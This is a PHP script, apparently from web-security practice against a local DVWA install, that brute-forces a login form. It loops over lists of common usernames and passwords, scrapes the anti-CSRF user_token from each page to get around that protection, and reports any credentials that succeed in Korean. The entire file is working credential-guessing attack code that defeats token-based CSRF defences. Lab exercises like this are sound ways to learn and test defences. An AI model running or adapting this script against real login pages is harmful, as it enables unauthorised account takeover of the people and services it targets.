<?php
$user_list = array( 'root', 'admin', 'manager' );
$pass_list = array( '123456', 'qwerty', '123456789', 'password', '12345678' );

foreach ($user_list as $user) {
    foreach ($pass_list as $pass) {
        $c = curl_init('http://localhost/3.dvwa/1.brutefource/1-3.bruteforce-GET.php');
        curl_setopt($c, CURLOPT_COOKIE, 'PHPSESSID=n0r3cn3mkdqmb5uhhok267btf8');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $page = curl_exec($c);
        $needle = "user_token' value='";
        $token = substr($page, strpos($page, $needle)+strlen($needle), 32);
        curl_close($c);

        $c = curl_init('http://localhost/3.dvwa/1.brutefource/1-3.bruteforce-GET.php?username='.$user.'&password='.$pass.'&Login=Login&user_token='.$token);
        curl_setopt($c, CURLOPT_COOKIE, 'PHPSESSID=gulk7ha641o55qk52os77asr42; security=high');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $page = curl_exec($c);
        curl_close($c);
        if (strstr($page, 'Username and/or password incorrect.')) continue;
        else {
            echo $user.'/'.$pass." 로그인 성공!\n";
            exit(0);
        }
    }
}